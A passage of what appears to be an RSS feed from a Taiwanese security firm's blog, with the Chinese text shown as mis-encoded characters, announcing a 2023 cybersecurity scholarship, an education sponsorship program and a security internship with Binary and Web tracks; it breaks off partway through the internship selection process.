  &lt;li&gt;ÁçéÂ≠∏ÈáëÈáëÈ°ç/ÂêçÈ°çÔºöÊØèÂπ¥Â∫¶Âèñ 10 ÂêçÔºåÊØèÂêçÂèØÁç≤ÂæóÁçéÂ≠∏ÈáëÊñ∞Âè∞Âπ£ 20,000 ÂÖÉÊï¥ÔºåÂÖ±Ë®à 20 Ëê¨ÂÖÉ„ÄÇÂ¶ÇÂ†±ÂêçË∏¥Ë∫çÊàëÂÄëÂ∞áË¶ñÁî≥Ë´ãÁãÄÊ≥ÅÂ¢ûÂä†ÂêçÈ°ç„ÄÇ&lt;/li&gt;
  &lt;li&gt;Áî≥Ë´ãÊôÇÁ®ãÔºö
    &lt;ul&gt;
      &lt;li&gt;2023/8/30 ÂÆòÁ∂≤ÂÖ¨ÂëäÁçéÂ≠∏ÈáëË®àÁï´Ë≥áË®ä&lt;/li&gt;
      &lt;li&gt;2023/8/31 - 2023/9/30 ÈñãÊîæÊî∂‰ª∂&lt;/li&gt;
      &lt;li&gt;2023/10/31 ÂÖ¨Â∏ÉÂØ©Êü•ÁµêÊûúÔºå‰∏¶Â∞áÊñº 11 Ëá≥ 12 ÊúàÈñìÈ†íÁôºÁçéÂ≠∏Èáë&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Áî≥Ë´ãËæ¶Ê≥ïÔºö
    &lt;ul&gt;
      &lt;li&gt;Ë´ã‰æù‚ΩÇ‰ª∂Ê™¢Ê†∏Ë°®È†ÖÊ¨°È†ÜÂ∫èÊéíÂàóÂ∑≤ÈôÑ‚ΩÇ‰ª∂ÔºåÂΩôÊï¥ÁÇ∫‚ºÄ‰ªΩ PDF Ê™îÊ°àÔºåÂØÑ‚æÑ scholarship@devco.re„ÄÇ&lt;/li&gt;
      &lt;li&gt;‰ø°‰ª∂‰∏ªÊó®Âèä PDF Ê™îÊ°àÂêçÁ®±Ë´ãÁ¨¶Âêà‰ª•‰∏ãÊ†ºÂºèÔºö[ÂÖ®ÂúãÁçéÂ≠∏‚æ¶Áî≥Ë´ã] Â≠∏Ê†°ÂêçÁ®±_Â≠∏Ëôü_ÂßìÂêçÔºàÁØÑ‰æãÔºö[ÂÖ®ÂúãÁçéÂ≠∏‚æ¶Áî≥Ë´ã] Ëºî‰ªÅ‚º§Â≠∏_B11100000_Áéã‚º©ÁæéÔºâ„ÄÇ&lt;/li&gt;
      &lt;li&gt;Ë´ãÁî≥Ë´ã‚ºà‚æÉÊàëÊ™¢Ê†∏‰∏¶ÊñºÁî≥Ë´ã‚ºàÊ™¢Ê†∏ÂçÄÂãæÈÅ∏Â∑≤ÈôÑ‚ΩÇ‰ª∂ÔºåËã•‚ΩÇ‰ª∂‰∏ç‚øëÊàñÊú™Á¢∫ÂØ¶ÂãæÈÅ∏ÊÅï‰∏çÂèóÁêÜÁî≥Ë´ã„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;È†àÊ™¢ÈôÑÊñá‰ª∂Ôºö
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;/assets/files/scholarship/Êà¥Â§´ÂØáÁàæÂÖ®ÂúãÁçéÂ≠∏ÈáëÁî≥Ë´ãË°®.pdf&quot;&gt;Êú¨ÁçéÂ≠∏‚æ¶Áî≥Ë´ãË°®&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;Âú®Â≠∏Ë≠âÊòé&lt;/li&gt;
      &lt;li&gt;ÊúÄËøë‚ºÄÂ≠∏ÊúüÊàêÁ∏æÂñÆ&lt;/li&gt;
      &lt;li&gt;Â≠∏ÁøíË≥áË®äÂÆâÂÖ®‰πãÂãïÊ©üËàáÊ≠∑Á®ã‚ººÂæó‚ºÄÁØáÔºöÂ≠óÊï∏ 500 - 2000 Â≠ó&lt;/li&gt;
      &lt;li&gt;Ë≥áË®äÂÆâÂÖ®ÊäÄË°ìÁõ∏ÈóúÁ†îÁ©∂ÊàêÊûúÔºöËá≥Â∞ëÈ†àÂæû‰ª•‰∏ãÂÖ≠È†ÖÁõÆ‰∏≠Êìá‰∏ÄÁπ≥‰∫§ÔºåÂåÖÂê´Á†îË®éÊúÉÊäïÁ®øÁµêÊûú„ÄÅÊºèÊ¥ûÁçéÂãµË®àÁï´ÊàêÊûú„ÄÅÂº±ÈªûÁ†îÁ©∂ÊàêÊûú„ÄÅË≥áË®äÂÆâÂÖ®ÊØîË≥ΩÊàêÊûú„ÄÅË≥áÂÆâÂ∑•ÂÖ∑Á†îÁ©∂ÊàêÊûú„ÄÅÊäÄË°ìÊñáÁ´†ÁôºË°®ÊàêÊûúÁ≠â&lt;/li&gt;
      &lt;li&gt;Á§æÁæ§Á∂ìÁáüÊàêÊûúÔºöËá≥Â∞ëÈ†àÂæû‰ª•‰∏ãÂÖ©È†ÖÁõÆ‰∏≠Êìá‰∏ÄÁπ≥‰∫§ÔºåÂåÖÂê´Ê†°ÂúíË≥áÂÆâÁ§æÂúò„ÄÅÂÖ¨ÈñãË≥áÂÆâÁ§æÁæ§Á≠â&lt;/li&gt;
      &lt;li&gt;Êé®Ëñ¶ÂáΩÔºöÂ∞éÂ∏´„ÄÅÁ≥ª‰∏ª‰ªª„ÄÅÂÖ∂‰ªñÊïôÊéàÊàñÊ•≠Áïå‚ºà‚º†Êé®Ëñ¶ÂáΩÔºå‚æÑÂ∞ëÈ†àÂèñÂæóÂÖ©Â∞Å‰ª•‰∏äÊé®Ëñ¶ÂáΩ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;devcore-Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÂäÉ&quot;&gt;DEVCORE Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÂäÉ&lt;/h3&gt;
&lt;p&gt;Âèñ‰πãÊñºÁ§æÊúÉÔºåÁî®‰πãÊñºÁ§æÊúÉ„ÄÇDEVCORE ÂâµÁ´ãËá≥‰ªäÂ∑≤Ê∫ñÂÇôÈÇÅÂÖ•Á¨¨ 11 Âπ¥ÔºåÊàëÂÄëÊúüÂæÖËÉΩ‰ª•‰∏çÂêåÁöÑÊñπÂºèÂä†Ê∑±Ê†°ÂúíËàáÁî¢Ê•≠ÁöÑÈÄ£ÁµêÔºåÊé®Âª£Ê≠£Á¢∫ÁöÑË≥áÂÆâÊÑèË≠òÂèäÈß≠ÂÆ¢ÊÄùÁ∂≠ÔºåÂçîÂä©Âè∞ÁÅ£Ë≥áÂÆâ‰∫∫ÊâçÊàêÈï∑ËåÅÂ£Ø„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ªäÂπ¥ÊàëÂÄë‰πüÂ∞áÊåÅÁ∫åË¥äÂä©Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïÔºåÊèê‰æõÁ∂ìË≤ª‰∫àË≥áÂÆâÁõ∏Èóú‰πãÁ§æÁæ§„ÄÅÁ§æÂúòËæ¶ÁêÜÂêÑÈ†ÖÊ¥ªÂãïÔºåÂáùËÅöÂè∞ÁÅ£Ë≥áÂÆâÁ§æÁæ§ÔºåÂä†ÈÄüÂüπËÇ≤Âè∞ÁÅ£ÁöÑË≥áÂÆâÊñ∞Èä≥„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Áî≥Ë´ãË≥áÊ†ºÔºöËàáË≥áÂÆâË≠∞È°åÁõ∏Èóú‰πãÁ§æÁæ§„ÄÅÁ§æÂúòÊ¥ªÂãïÔºåË´ãÁî± 1 ‰ΩçÁ§æÂúò‰ª£Ë°®‰∫∫Â°´ÂØ´Ë≥áÊñô„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ë¥äÂä©ÈáëÈ°çÔºö‰æùÂêÑÁ§æÂúòÊ¥ªÂãïÈúÄÊ±ÇÂèäËàáÊà¥Â§´ÂØáÁàæË®éË´ñËÄåÂÆöÔºåÊØèÊ¨°ÊúÄÈ´òË£úÂä©ÈáëÈ°çÁÇ∫Êñ∞Âè∞Âπ£ 20,000 ÂÖÉÊï¥„ÄÇ&lt;/li&gt;
  &lt;li&gt;Áî≥Ë´ãÊôÇÁ®ãÔºöÂ¶ÇÊ¨≤Áî≥Ë´ãÊ≠§Ë®àÁï´ÁöÑÁ§æÂúòÊàñÊ¥ªÂãïÔºåË´ãÊñº 2023/10/31 ÂâçÈÄèÈÅé‰ª•‰∏ãÈÄ£ÁµêÂ°´ÂØ´ÂàùÊ≠•Ë≥áÊñôÔºåÊàëÂÄëÊúÉÂú® 30 Êó•ÂÖßÈÄöÁü•Á¨¶ÂêàÁî≥Ë´ãË≥áÊ†ºËÄÖÊèê‰æõÈÄ≤‰∏ÄÊ≠•Ë≥áÊñôÔºå‰∏çÁ¨¶ÂêàË≥áÊ†ºËÄÖÂ∞á‰∏çÂè¶Ë°åÈÄöÁü•„ÄÇ&lt;/li&gt;
  &lt;li&gt;Áî≥Ë´ãÈÄ£ÁµêÔºö&lt;a href=&quot;https://forms.gle/dW3GcGjw5z8WQ9pV9&quot; target=&quot;_blank&quot;&gt;DEVCORE 2023 Âπ¥Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë™øÊü•&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;È†àÊèê‰æõË≥áÊñôÔºö
    &lt;ul&gt;
      &lt;li&gt;Áî≥Ë´ãË≥áÊ†ºÔºöÁî≥Ë´ã‰∫∫ÈúÄ‰ª•ÂêÑË≥áÂÆâÁ§æÁæ§ÊàñÁ§æÂúòÂêçÁæ©ÊèêÂá∫Áî≥Ë´ã„ÄÇ&lt;/li&gt;
      &lt;li&gt;ËÅØÁµ°ÈõªÂ≠êÈÉµ‰ª∂&lt;/li&gt;
      &lt;li&gt;ÊÉ≥Ë¶ÅËæ¶ÁêÜÁöÑÊ¥ªÂãïÈ°ûÂûã&lt;/li&gt;
      &lt;li&gt;ÊÉ≥Ë¶ÅËæ¶ÁêÜÁöÑÊ¥ªÂãïÊñπÂºè&lt;/li&gt;
      &lt;li&gt;Ê¥ªÂãïÁ∏ΩÈ†êÁÆó&lt;/li&gt;
      &lt;li&gt;È†êË®àÈúÄË¶ÅË¥äÂä©ÈáëÈ°ç&lt;/li&gt;
      &lt;li&gt;‰ª£Ë°®‰∫∫ÂßìÂêç„ÄÅÈÄ£Áµ°ÈõªË©±&lt;/li&gt;
      &lt;li&gt;ÂúòÈ´îÂêçÁ®±&lt;/li&gt;
      &lt;li&gt;ÂúòÈ´îÂñÆ‰ΩçÁ∂≤ÂùÄ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Ê≥®ÊÑè‰∫ãÈ†ÖÔºö
    &lt;ul&gt;
      &lt;li&gt;Áî≥Ë´ãÊ°àÂØ©Ê†∏Â∞áÁ∂ìÈÅéÊà¥Â§´ÂØáÁàæÂÖßÈÉ®ÂØ©Ê†∏Ê©üÂà∂Ôºå‰∏¶‰øùÊúâÊúÄÁµÇÊ†∏Ê±∫Ê¨ä„ÄÇ&lt;/li&gt;
      &lt;li&gt;Êú¨ÂïèÂç∑ÂÉÖ‰æõÂàùÊ≠•ÊÑèÈ°òËíêÈõÜÁî®ÈÄîÔºåÁ¨¶ÂêàÁî≥Ë´ãË≥áÊ†ºËÄÖÔºåÊà¥Â§´ÂØáÁàæÂ∞áÊñº 30 Êó•ÂÖßÈÄöÁü•Êèê‰æõÈÄ≤‰∏ÄÊ≠•Ë≥áÊñô‰æõÂØ©Ê†∏ÔºåÂÖ∂È§òÂ∞á‰∏çÂè¶Ë°åÈÄöÁü•„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2023/08/30/2023-devcore-cybersecurity-scholarship-application-opens/</link>
                <guid>https://devco.re/blog/2023/08/30/2023-devcore-cybersecurity-scholarship-application-opens</guid>
                <pubDate>Wed, 30 Aug 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2023 Á¨¨ÂõõÂ±ÜÂØ¶ÁøíÁîüË®àÁï´</title>
                <description>&lt;p&gt;DEVCORE ÂâµÁ´ãËøÑ‰ªäÂ∑≤ÈÄæÂçÅÂπ¥ÔºåÊåÅÁ∫åÂ∞àÊ≥®ÊñºÊèê‰æõ‰∏ªÂãïÂºèË≥áÂÆâÊúçÂãôÔºå‰∏¶Ëá¥ÂäõÂ∞ãÊâæÂêÑÁ®ÆÂÆâÂÖ®È¢®Èö™ÂèäÊºèÊ¥ûÔºåËÆì‰∏ñÁïåËÆäÂæóÊõ¥ÂÆâÂÖ®„ÄÇÁÇ∫‰∫ÜÊåÅÁ∫åÂ∞ãÊâæÊõ¥Â§öÊìÅÊúâÁõ∏ÂêåÁêÜÂøµÁöÑË≥áÂÆâÊñ∞Èä≥„ÄÅÂçîÂä©Â≠∏ÁîüÂª∫ÊßãÊ≠£Á¢∫Ë≥áÂÆâÊÑèË≠òÂèäÊäÄËÉΩÔºåÊàëÂÄëÊàêÁ´ã‰∫Ü„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÔºå2022 Âπ¥Âàù‰πüÈñãÂßãËàâËæ¶È¶ñÂ±ÜÂØ¶ÁøíÁîüË®àÁï´ÔºåÁõÆÂâçÁÇ∫Ê≠¢ÊàêÊûúÈ†óË±ê„ÄÅË∂Ö‰πéÈ†êÊúüÔºåÁ¨¨‰∏âÂ±ÜÂØ¶ÁøíÁîüË®àÁï´‰πüÂ∞áÊñº‰ªäÂπ¥ 7 ÊúàÂ∫ïÂëä‰∏ÄÊÆµËêΩ„ÄÇÊàëÂÄëÂæàÊ¶ÆÂπ∏Âú∞ÂÆ£‰ΩàÔºåÁ¨¨ÂõõÂ±ÜÂØ¶ÁøíÁîüË®àÁï´Âç≥Â∞áÁôªÂ†¥ÔºåËã•ÊÇ®ÊúüÂæÖÂä†ÂÖ•ÊàëÂÄë„ÄÅÁ≤æÈÄ≤Ë≥áÂÆâÊäÄËÉΩÔºåÁÖ©Ë´ãË©≥Èñ±‰∏ãÂàóË≥áË®äÂæå‰æÜ‰ø°Â†±ÂêçÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÂÖßÂÆπ&quot;&gt;ÂØ¶ÁøíÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÂØ¶ÁøíÂàÜÁÇ∫ Binary Âèä Web ÂÖ©ÂÄãÁµÑÂà•Ôºå‰∏ªË¶ÅÂÖßÂÆπÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
‰ª•Á†îÁ©∂ÁÇ∫‰∏ªÔºåÂú®ËàáÂ∞éÂ∏´Á¢∫ÂÆöÁ†îÁ©∂Ê®ôÁöÑÂæåÔºåÂàÜÊûêÁõÆÊ®ôÊû∂Êßã„ÄÅÈÄ≤Ë°åÈÄÜÂêëÂ∑•Á®ãÊàñÁ®ãÂºèÁ¢ºÂØ©Êü•„ÄÇËóâÁî±ÈÄôÂÄãÈÅéÁ®ãË®ìÁ∑¥Ëá™Â∑±ÁöÑÊÄùË∑ØÔºåÊâæÂá∫ÂèØËÉΩÁöÑÊîªÊìäÈù¢ËàáÊΩõÂú®ÁöÑÂº±Èªû„ÄÇÂè¶Â§ñ‰πüÊúÉËÆìÂ§ßÂÆ∂ÂòóË©¶ÂàÜÊûêÂèäÂØ´ÈÅéÂæÄÊºèÊ¥ûÁöÑ ExploitÔºåÁêÜËß£ÈÅéÂéªÊºèÊ¥ûÈÉΩÂá∫ÁèæÂú®Âì™ÔºåÈ´îÈ©óÁúüÂØ¶‰∏ñÁïåÁöÑÊºèÊ¥ûÈÉΩÊòØÂ¶Ç‰ΩïÂà©Áî®„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûÊåñÊéòÂèäÁ†îÁ©∂ 70 %&lt;/li&gt;
      &lt;li&gt;1-day ÈñãÁôº (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
Â∞éÂ∏´ÊúÉËàáÂ≠∏ÁîüË®éË´ñ‰∏¶Á¢∫ÂÆö‰∏ÄÂÄã‰ª•Â≠∏ÁîüÁöÑÊúüÊúõÁÇ∫‰∏ªÁöÑÂØ¶ÁøíÁõÆÊ®ôÔºå‰∏¶Âú®ÈÅéÁ®ãËºîÂ∞éÊàêÈï∑‰ª•ÂÆåÊàêÁõÆÊ®ôÔºåÂÖßÂÆπÂèØ‰ª•ÊòØÊ∑±ÂÖ•Á†îÁ©∂ËøëÂπ¥Â∏∏Ë¶ãÊñ∞ÂûãÊÖãÊºèÊ¥û„ÄÅÊîªÊìäÊâãÊ≥ï„ÄÅÈñãÊ∫êËªüÈ´îÔºåÊàñÊòØÁ®ãÂºèË™ûË®ÄÁîüÊÖãÁ≥ªÁöÑÂ∏∏Ë¶ãÂº±ÈªûÔºå‰∫¶ÊàñÊòØÂ±ïÁèæ‰Ω†ÁöÑÊäÄË°ìÂäõ‰ª•ÈñãÁôºËàáÁ¥ÖÈöäÁõ∏ÈóúÁöÑÂ∑•ÂÖ∑„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥û„ÄÅÊîªÊìäÊâãÊ≥ïÊàñÈñãÁôºÂ∑•ÂÖ∑Á†îÁ©∂ 90%&lt;/li&gt;
      &lt;li&gt;ÊàêÊûúÂ†±ÂëäËàáÊ∫ñÂÇô 10%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂÖ¨Âè∏Âú∞Èªû&quot;&gt;ÂÖ¨Âè∏Âú∞Èªû&lt;/h3&gt;

&lt;p&gt;Âè∞ÂåóÂ∏ÇÊùæÂ±±ÂçÄÂÖ´Âæ∑Ë∑Ø‰∏âÊÆµ 32 Ëôü 13 Ê®ì&lt;/p&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊôÇÈñì&quot;&gt;ÂØ¶ÁøíÊôÇÈñì&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2023 Âπ¥ 9 ÊúàÈñãÂßãÂà∞ 2024 Âπ¥ 1 ÊúàÂ∫ïÔºåÂÖ± 5 ÂÄãÊúà„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊØèÈÄ±Â∑•‰ΩúÂÖ©Â§©ÔºåÂ∑•‰ΩúÊôÇÈñìÁÇ∫ 10:00 ‚Äì 18:00
    &lt;ul&gt;
      &lt;li&gt;ÊØèÈÄ±Âõ∫ÂÆö‰∏ÄÂ§©‰∏ãÂçà 14:00 - 18:00 ÂøÖÈ†àÂà∞ÂÖ¨Âè∏Ë®éË´ñÈÄ≤Â∫¶
        &lt;ul&gt;
          &lt;li&gt;Â¶ÇÊûúÂ±Ö‰ΩèÈõôÂåóÂ§ñÂèØÂΩàÊÄßË™øÊï¥(‰ΩÜÈ†àÊØèÂÄãÁµÑÂà•Áµ±‰∏Ä)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ÂÖ∂È§òÊôÇÈñìÁöÜÁÇ∫ÈÅ†Á´Ø‰ΩúÊ•≠&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊãõÂãüÂ∞çË±°&quot;&gt;ÊãõÂãüÂ∞çË±°&lt;/h3&gt;

&lt;p&gt;ÂÖ∑Êúâ‰∏ÄÂÆöÁ®ãÂ∫¶Ë≥áÂÆâËÉåÊôØÁöÑÂ≠∏ÁîüÔºå‰∏îÂèØÊØèÈÄ±Â∑•‰ΩúÂÖ©Â§©„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;È†êË®àÊãõÊî∂ÂêçÈ°ç&quot;&gt;È†êË®àÊãõÊî∂ÂêçÈ°ç&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
  &lt;li&gt;Web ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëñ™Ë≥áÂæÖÈÅá&quot;&gt;Ëñ™Ë≥áÂæÖÈÅá&lt;/h3&gt;

&lt;p&gt;ÊØèÊúàÊñ∞Âè∞Âπ£ 16,000 ÂÖÉ&lt;/p&gt;

&lt;h2 id=&quot;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&quot;&gt;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&lt;/h2&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&quot;&gt;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Âü∫Êú¨ÈÄÜÂêëÂ∑•Á®ãÂèäÈô§ÈåØËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;ËÉΩÁúãÊáÇÁµÑÂêàË™ûË®Ä‰∏¶Áû≠Ëß£Âü∫Êú¨ Debugger ‰ΩøÁî®ÊäÄÂ∑ß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âü∫Êú¨ÊºèÊ¥ûÂà©Áî®ËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;È†àÁü•ÈÅì Stack overflow„ÄÅROP Á≠âÁõ∏ÈóúÂà©Áî®ÊäÄÂ∑ß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âü∫Êú¨ Scripting Language ÈñãÁôºËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;Python„ÄÅRuby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂàÜÊûêÂ§ßÂûã Open Source Â∞àÊ°àËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;‰ª• C/C++ ÁÇ∫‰∏ª&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂü∫Á§é‰ΩúÊ•≠Á≥ªÁµ±Áü•Ë≠ò
    &lt;ul&gt;
      &lt;li&gt;‰æãÂ¶ÇÁü•ÈÅì Virtual Address Ëàá Physical Address ÁöÑÊ¶ÇÂøµ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;Áü•ÈÅìÊÄéÊ®£ÂØ´ÁöÑÁ®ãÂºèÁ¢ºÊúÉÊúâÂïèÈ°å
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;‚Ä¶&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÁ†îÁ©∂ÁÜ±Ë™†ÔºåÁøíÊÖ£‰∫ÜËß£ÊäÄË°ìÊú¨Ë≥™&lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;CTF ÊØîË≥ΩÁ∂ìÈ©ó&lt;/li&gt;
      &lt;li&gt;pwnable.tw ÊàêÁ∏æ&lt;/li&gt;
      &lt;li&gt;Ê®ÇÊñºÂàÜ‰∫´ÊäÄË°ì
        &lt;ul&gt;
          &lt;li&gt;ÊúâÂÖ¨ÈñãÁöÑÊäÄË°ì blog/slide„ÄÅWrite-ups ÊàñÊòØÊºîË¨õ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Á≤æÈÄö IDA Pro Êàñ Ghidra&lt;/li&gt;
      &lt;li&gt;ÊúâÂØ´ÈÅé 1-day Âà©Áî®Á®ãÂºè&lt;/li&gt;
      &lt;li&gt;ÂÖ∑ÂÇô‰∏ãÂàóÂÖ∂‰∏≠‰πã‰∏ÄÁ∂ìÈ©ó
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ÁÜüÊÇâ OWASP Web Top 10„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁêÜËß£ PortSwigger Web Security Academy ‰∏≠ÊâÄÊúâÁöÑÂÆâÂÖ®Ë≠∞È°åÊàñÂ∑≤ÂÆåÊàêÊâÄÊúâ Lab„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÂèÉËÄÉÈÄ£ÁµêÔºöhttps://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÁêÜËß£Ë®àÁÆóÊ©üÁ∂≤Ë∑ØÁöÑÂü∫Êú¨Ê¶ÇÂøµ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ Command Line Êìç‰ΩúÔºåÂåÖÂê´ Unix-like Âíå Windows ‰ΩúÊ•≠Á≥ªÁµ±ÁöÑÂ∏∏Ë¶ãÊàñÂÖßÂª∫Á≥ªÁµ±Êåá‰ª§Â∑•ÂÖ∑„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®ÆÁ∂≤È†ÅÁ®ãÂºèË™ûË®ÄÔºàÂ¶ÇÔºöPHP„ÄÅASP.NET„ÄÅJSPÔºâÔºåÂÖ∑ÂÇôÂèØ‰ª•Âª∫Á´ãÂÆåÊï¥Á∂≤È†ÅÊúçÂãôÁöÑËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®Æ Scripting LanguageÔºàÂ¶ÇÔºöShell Script„ÄÅPython„ÄÅRubyÔºâÔºå‰∏¶ËÉΩ‰ΩøÁî®ËÖ≥Êú¨Ëºî‰ª•Á†îÁ©∂„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÈô§ÈåØËÉΩÂäõÔºåËÉΩÂñÑÁî® Debugger ËøΩËπ§Á®ãÂºèÊµÅÁ®ã„ÄÅËÉΩÈáçÁèæ‰∏¶Êî∂ÊñÇÂïèÈ°å„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂèØ‰ª•Âª∫ÁΩÆ„ÄÅË®≠ÂÆöÂ∏∏Ë¶ãÁ∂≤È†Å‰º∫ÊúçÂô®ÔºàÂ¶ÇÔºöNginx„ÄÅApacheÔºâÂèä‰ΩúÊ•≠Á≥ªÁµ±ÔºàÂ¶ÇÔºöLinuxÔºâÁöÑËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôËøΩÊ†πÁ©∂Êü¢ÁöÑÁ≤æÁ•û„ÄÇ&lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÊåñÊéòÈÅé 0-day ÊºèÊ¥û„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÂàÜÊûêÈÅéÂ∑≤Áü•ÊºèÊ¥û‰∏¶ËÉΩÊí∞ÂØ´ 1-day exploit„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÊñº CTF ÊØîË≥Ω‰∏≠Êìî‰ªªÂá∫È°åËÄÖ‰∏¶Âª∫ÁΩÆÈÅéÈ°åÁõÆ„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊìÅÊúâ OSCP Ë≠âÁÖßÊàñÂêåÁ≠âËÉΩÂäõ‰πãË≠âÁÖß„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊáâÂæµÊµÅÁ®ã&quot;&gt;ÊáâÂæµÊµÅÁ®ã&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÁîÑÈÅ∏‰∏ÄÂÖ±ÂàÜÁÇ∫‰∫åÂÄãÈöéÊÆµÔºö&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∏ÄÈöéÊÆµÊõ∏Èù¢ÂØ©Êü•&quot;&gt;Á¨¨‰∏ÄÈöéÊÆµÔºöÊõ∏Èù¢ÂØ©Êü•&lt;/h4&gt;

&lt;p&gt;Á¨¨‰∏ÄÈöéÊÆµÁÇ∫Êõ∏Èù¢ÂØ©Êü•ÔºåÊúÉÈúÄË¶ÅÂØ©Êü•‰∏ãÂàóÂÖ©ÂÄãÈ†ÖÁõÆ&lt;/p&gt;
